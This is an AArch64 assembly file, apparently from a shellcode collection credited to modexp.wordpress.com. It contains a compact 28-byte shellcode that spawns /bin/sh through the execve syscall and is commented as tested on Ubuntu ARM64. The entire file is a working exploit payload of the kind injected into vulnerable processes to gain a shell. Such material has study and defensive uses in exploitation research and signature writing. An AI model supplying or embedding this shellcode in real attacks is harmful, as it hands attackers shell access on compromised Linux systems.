/**
  execute /bin/sh
  tested with ubuntu/AArch64

  http://modexp.wordpress.com/   
*/

// 28 bytes
    .global _start
    .text

_start:
    // execve("/bin/sh", NULL, NULL);
    adr    x0, sh         // x0 = "/bin/sh"
    eor    x1, x1, x1     // x1 = NULL
    eor    x2, x2, x2     // x2 = NULL
    mov    x8, #221       // x8 = execve
    svc    0
sh:    
    .ascii "/bin/sh\0"
